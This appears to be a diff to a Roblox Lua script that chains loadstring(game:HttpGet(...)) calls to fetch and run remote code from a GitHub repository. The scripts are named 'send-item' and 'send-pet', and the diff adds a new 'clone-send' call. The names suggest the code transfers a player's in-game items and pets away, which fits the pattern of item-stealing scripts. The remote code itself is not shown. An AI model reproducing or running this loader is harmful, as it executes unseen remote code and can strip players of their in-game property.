@@ -12,4 +12,6 @@ _G.SCRIPT1 = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/02/main/send-item"))()
 task.wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/02/main/send-pet"))()
+task.wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/02/main/clone-send"))()
 --loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/02/main/user-item"))()
